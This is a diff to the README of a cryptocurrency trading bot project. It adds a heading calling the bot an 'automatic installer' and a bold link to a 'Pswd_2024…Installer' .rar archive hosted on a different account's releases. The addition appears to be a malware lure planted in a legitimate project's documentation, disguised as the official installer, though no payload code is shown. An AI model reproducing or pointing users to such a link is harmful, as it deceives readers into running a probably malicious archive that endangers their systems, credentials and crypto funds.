@@ -1,5 +1,8 @@
 # Crypto Trading Bot
 
+## Crypto Trading Bot is an automatic installer. All you need to do is run the program, and it will automatically install all the necessary components. 🤖🔧📈
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+
 [![Build Status](https://github.com/Haehnchen/crypto-trading-bot/actions/workflows/node.js.yml/badge.svg)](https://github.com/Haehnchen/crypto-trading-bot/actions/workflows/node.js.yml)
 
 A **work in progress** Cryptocurrency for common exchanges like Bitfinex, Bitmex and Binance.
